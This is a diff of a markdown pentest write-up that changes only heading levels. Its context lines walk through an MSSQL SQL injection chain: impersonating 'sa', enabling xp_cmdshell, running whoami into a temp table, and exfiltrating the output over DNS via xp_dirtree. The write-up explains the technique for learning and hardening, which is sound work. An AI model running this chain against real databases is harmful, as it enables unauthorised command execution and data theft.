@@ -13,7 +13,7 @@ GET /app/search/query.asp?filter=1;EXEC+AS+LOGIN='sa';EXEC+sp_configure+'xp_cmds
 
 Ugly? Yep. But *it werks*. Let's break it down step by step:
 
-### step 1: impersonate the sysadmin
+## step 1: impersonate the sysadmin
 
 ```sql
 EXEC AS LOGIN = 'sa'
@@ -25,7 +25,7 @@ Why does this matter? Because most of the fun stuff (enabling `xp_cmdshell`, run
 
 Scott Sutherland from [NetSPI documented this escalation path extensively](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-stored-procedures-part-2-user-impersonation/), and there's even a Metasploit module for it (`mssql_escalate_execute_as`). It's not exotic. It's just frequently overlooked during hardening.
 
-### step 2: enable xp_cmdshell
+## step 2: enable xp_cmdshell
 
 ```sql
 EXEC sp_configure 'xp_cmdshell', 1;
@@ -43,7 +43,7 @@ EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 ```
 
-### step 3: run whoami and store the output
+## step 3: run whoami and store the output
 
 ```sql
 CREATE TABLE #tmp (col VARCHAR(999));
@@ -56,7 +56,7 @@ The workaround: create a temp table (`#tmp`), execute `whoami`, and dump the out
 
 `#tmp` is a session-scoped temporary table, meaning it only exists for the duration of our connection and doesn't pollute the actual schema. Nice and clean.
 
-### step 4: exfiltrate via dns
+## step 4: exfiltrate via dns
 
 This is the fun part.
 
@@ -82,7 +82,7 @@ Let me unpack each line:
 
 3. **triggering the DNS lookup:** `xp_dirtree` is an undocumented stored procedure whose original purpose is listing files in a directory. but when you point it at a UNC path, MSSQL tries to resolve the hostname via DNS. this is the classic out-of-band (OOB) exfiltration channel for MSSQL injection. the DNS query lands on your Burp Collaborator (or [interactsh](https://github.com/projectdiscovery/interactsh), or your own authoritative DNS server), and the exfiltrated data shows up as a subdomain prefix.
 
-### step 5: clean up
+## step 5: clean up
 
 ```sql
 DROP TABLE #tmp;
@@ -97,7 +97,7 @@ This is the part most people skip, and it's the part that separates a profession
 
 Leave things the way you found them. Always.
 
-### step 6: the trailing select
+## step 6: the trailing select
 
 ```sql
 SELECT modified, client_id, contact
@@ -111,7 +111,7 @@ The original query expected a `WHERE` clause filter, and our injection sits righ
 
 I managed to infer the table and column names because the app gave verbose SQL error messages. Those errors were the initial breadcrumb that led to the whole chain, kek.
 
-### jackpot
+## jackpot
 
 So if everything goes right, you see a DNS hit for something like:
 
@@ -119,11 +119,11 @@ So if everything goes right, you see a DNS hit for something like:
 
 Yay! This confirms the SQL Server service account is singing for us. 💅🏻
 
-### the full chain, visualized
+## the full chain
 
 ![full chain](/assets/img/mermaid-sqlirce.png)
 
-### why this worked
+## why this worked
 
 Before we wrap, let's give a round of applause to all the misconfigs that made this possible:
 
